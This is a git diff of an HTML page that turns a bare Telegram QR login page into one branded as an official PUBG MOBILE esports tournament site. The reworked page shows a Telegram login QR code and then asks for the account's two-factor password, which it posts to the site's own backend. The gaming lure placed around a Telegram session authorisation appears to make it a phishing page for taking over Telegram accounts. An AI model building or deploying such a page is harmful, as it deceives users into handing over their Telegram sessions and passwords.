@@ -1,123 +1,341 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Telegram QR Login</title>
-    <style>
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            padding: 40px;
-        }
-        img {
-            border: 1px solid #ccc;
-        }
-        /* status UI removed; status handling is server-side logging only */
-    </style>
+<meta charset="UTF-8">
+<title>ESPORT PUBG MOBILE — Secure Telegram Login</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="icon" href="/static/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png">
+
+<style>
+:root{
+  --bg-main:#020814;
+  --bg-card:#0b101c;
+  --bg-card-soft:#0f1628;
+  --accent:#ffb800;
+  --accent-alt:#ff8a00;
+  --accent-green:#22c55e;
+  --text:#ffffff;
+  --text-soft:#e5e7eb;
+  --text-muted:#9ca3af;
+
+  --radius-xl:22px;
+  --radius-lg:16px;
+  --radius-full:999px;
+
+  --shadow-soft:0 20px 60px rgba(0,0,0,.75);
+  --transition:.18s ease;
+
+  --font:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+}
+
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:var(--font);
+  background:var(--bg-main);
+  color:var(--text);
+}
+
+/* ===== HEADER / HERO ===== */
+.hero{
+  position:relative;
+  height:42vh;
+  min-height:260px;
+  background:url("/static/172f6786de4f4d5591f3b061f472e935_fit.webp")
+             center / cover no-repeat;
+}
+.hero::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:linear-gradient(
+    to bottom,
+    rgba(2,8,20,.25),
+    rgba(2,8,20,.85)
+  );
+}
+
+/* ===== MAIN CONTENT ===== */
+.main{
+  max-width:1100px;
+  margin:-80px auto 0;
+  padding:0 20px 60px;
+  position:relative;
+  z-index:2;
+}
+
+.panel{
+  display:grid;
+  grid-template-columns: 1.2fr .8fr;
+  gap:20px;
+}
+
+/* ===== TOURNAMENT CARD ===== */
+.tournament-card{
+  background:var(--bg-card);
+  border-radius:var(--radius-xl);
+  overflow:hidden;
+  box-shadow:var(--shadow-soft);
+  border:1px solid rgba(255,255,255,.06);
+}
+
+.tournament-card img{
+  width:100%;
+  display:block;
+}
+
+.tournament-info{
+  padding:16px 18px 18px;
+}
+
+.tournament-title{
+  font-size:13px;
+  letter-spacing:.16em;
+  text-transform:uppercase;
+  color:var(--accent);
+  margin-bottom:6px;
+}
+
+.tournament-text{
+  font-size:11px;
+  color:var(--text-muted);
+  line-height:1.5;
+}
+
+/* ===== LOGIN CARD ===== */
+.login-card{
+  background:
+    linear-gradient(180deg, rgba(255,255,255,.03), transparent),
+    var(--bg-card);
+  border-radius:var(--radius-xl);
+  padding:20px;
+  box-shadow:var(--shadow-soft);
+  border:1px solid rgba(255,255,255,.08);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:14px;
+}
+
+.login-title{
+  font-size:12px;
+  letter-spacing:.18em;
+  text-transform:uppercase;
+  color:var(--text-muted);
+}
+
+/* BUTTON */
+.pubg-btn{
+  padding:15px 42px;
+  border-radius:var(--radius-full);
+  border:0;
+  cursor:pointer;
+  font-size:14px;
+  font-weight:800;
+  letter-spacing:.18em;
+  text-transform:uppercase;
+  color:#000;
+  background:linear-gradient(90deg,var(--accent-alt),var(--accent));
+  box-shadow:0 14px 36px rgba(0,0,0,.9),0 0 28px rgba(255,184,0,.7);
+  transition:var(--transition);
+}
+.pubg-btn:hover{
+  transform:translateY(-2px);
+  box-shadow:0 20px 46px rgba(0,0,0,1),0 0 36px rgba(255,184,0,.9);
+}
+
+/* ===== OVERLAY AUTH ===== */
+.auth-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(2,6,16,.88);
+  backdrop-filter:blur(18px);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:1000;
+  padding:16px;
+}
+
+.auth-card{
+  width:100%;
+  max-width:380px;
+  padding:20px 20px 22px;
+  border-radius:var(--radius-xl);
+  background:var(--bg-card);
+  border:1px solid rgba(255,255,255,.08);
+  box-shadow:var(--shadow-soft);
+  text-align:center;
+}
+
+.auth-title{
+  font-size:11px;
+  letter-spacing:.18em;
+  text-transform:uppercase;
+  color:var(--accent);
+  margin-bottom:6px;
+}
+
+.auth-sub{
+  font-size:9px;
+  color:var(--text-muted);
+  margin-bottom:14px;
+}
+
+.qr-frame{
+  width:220px;
+  height:220px;
+  margin:0 auto 14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:var(--bg-card-soft);
+  border-radius:var(--radius-lg);
+  border:1px solid rgba(255,255,255,.06);
+}
+
+.qr-frame img{
+  width:180px;
+  height:180px;
+  background:#fff;
+  padding:8px;
+  border-radius:12px;
+}
+
+.checkmark{
+  display:none;
+  font-size:64px;
+  color:var(--accent-green);
+}
+
+.password-input{
+  width:100%;
+  margin-top:10px;
+  padding:11px 14px;
+  border-radius:var(--radius-full);
+  border:1px solid rgba(255,255,255,.12);
+  background:#040812;
+  color:var(--text-soft);
+  font-size:13px;
+}
+
+.password-error{
+  margin-top:8px;
+  font-size:11px;
+  color:#f97316;
+}
+
+/* ===== MOBILE ===== */
+@media (max-width:900px){
+  .panel{
+    grid-template-columns:1fr;
+  }
+  .main{
+    margin-top:-60px;
+  }
+}
+</style>
 </head>
+
 <body>
 
-<h2>Telegram QR Login</h2>
+<!-- HERO -->
+<div class="hero"></div>
 
-<button onclick="start()">Start login</button>
-<br><br>
+<!-- MAIN -->
+<div class="main">
+  <div class="panel">
 
-<img id="qr" width="300" alt="Telegram QR code">
-<br><br>
+    <!-- TOURNAMENT -->
+    <div class="tournament-card">
+      <img src="/static/123414112131.png" alt="Tournament banner">
+      <div class="tournament-info">
+        <div class="tournament-title">Featured tournament</div>
+        <div class="tournament-text">
+          Official PUBG MOBILE tournament coverage.
+          Join the competition, follow standings and participate in community events.
+        </div>
+      </div>
+    </div>
 
+    <!-- LOGIN -->
+    <div class="login-card">
+      <div class="login-title">Secure access</div>
+      <button class="pubg-btn" onclick="startLogin()">Start login</button>
+    </div>
 
-<div id="password-area" style="display:none">
-    <input id="password" placeholder="2FA password">
-    <button onclick="sendPassword()">Send password</button>
+  </div>
+</div>
+
+<!-- AUTH OVERLAY -->
+<div id="overlay" class="auth-overlay">
+  <div class="auth-card">
+    <div class="auth-title">Telegram verification</div>
+    <div class="auth-sub">Confirm your identity to continue</div>
+
+    <div class="qr-frame">
+      <img id="qr" alt="Telegram QR">
+      <div id="ok" class="checkmark">✔</div>
+    </div>
+
+    <input id="password" class="password-input" type="password"
+           placeholder="Account password" style="display:none">
+    <div id="err" class="password-error" style="display:none"></div>
+  </div>
 </div>
 
 <script>
-    let loginId = null
+let loginId=null
 
-    async function start() {
-        console.log("Starting login")
+async function startLogin(){
+  overlay.style.display="flex"
+  const r=await fetch("/auth/start",{method:"POST"})
+  const d=await r.json()
+  loginId=d.login_id
+  qr.src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data="+
+         encodeURIComponent(d.qr_url)
+}
 
-        try {
-            const res = await fetch("/auth/start", {
-                method: "POST"
-            })
-
-            if (!res.ok) {
-                throw new Error("Backend error: " + res.status)
-            }
-
-            const data = await res.json()
-            loginId = data.login_id
-
-            document.getElementById("qr").src =
-                "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" +
-                encodeURIComponent(data.qr_url)
-            console.log("QR shown; waiting for scan")
-
-        } catch (e) {
-            console.error(e)
-            alert("Start login failed. Check console.")
-        }
+(()=>{
+  const proto=location.protocol==="https:"?"wss":"ws"
+  const ws=new WebSocket(`${proto}://${location.host}/auth/ws/messages`)
+  ws.onmessage=e=>{
+    const m=JSON.parse(e.data)
+    if(m.login_id!==loginId)return
+    if(m.type==="need_password"){
+      password.style.display="block"
+      password.focus()
     }
-
-    // NOTE: polling/status removed — status reporting is now server-side logging only.
-    // WebSocket: listen for server events (need_password / authorized)
-    (function setupWS(){
-        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:'
-        const wsUrl = `${proto}//${location.host}/auth/ws/messages`
-        let ws
-        try {
-            ws = new WebSocket(wsUrl)
-        } catch (e) {
-            console.error('WS connect failed', e)
-            return
-        }
-
-        ws.onopen = () => console.log('WS connected')
-        ws.onclose = () => console.log('WS closed')
-        ws.onerror = (e) => console.error('WS error', e)
-        ws.onmessage = (ev) => {
-            try {
-                const msg = JSON.parse(ev.data)
-                // Expect messages like { type: 'need_password'|'authorized', login_id: '...' }
-                if (!msg || !msg.type) return
-                if (msg.login_id && msg.login_id !== loginId) return
-
-                if (msg.type === 'need_password') {
-                    document.getElementById('password-area').style.display = 'block'
-                    console.log('2FA required for login', msg.login_id)
-                }
-                if (msg.type === 'authorized') {
-                    // On successful authorization navigate to the next page
-                    console.log('Authorized', msg.login_id)
-                    window.location.href = '/next'
-                }
-            } catch (e) {
-                console.error('WS message parse error', e)
-            }
-        }
-    })()
-    async function sendPassword() {
-        if (!loginId) {
-            alert("Start login first")
-            return
-        }
-
-        const pwd = document.getElementById("password").value
-
-        try {
-            await fetch("/auth/password", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    login_id: loginId,
-                    password: pwd
-                })
-            })
-        } catch (e) {
-            console.error(e)
-            alert("Password submit failed")
-        }
+    if(m.type==="authorized"){
+      qr.style.display="none"
+      password.style.display="none"
+      err.style.display="none"
+      ok.style.display="block"
+      setTimeout(()=>location.href="/next",1200)
     }
+  }
+})()
+
+password.addEventListener("keydown",e=>{
+  if(e.key==="Enter")sendPassword()
+})
+
+async function sendPassword(){
+  err.style.display="none"
+  const r=await fetch("/auth/password",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({login_id:loginId,password:password.value})
+  })
+  if(!r.ok){
+    err.textContent="Incorrect password. Try again."
+    err.style.display="block"
+  }
+}
 </script>
 
 </body>
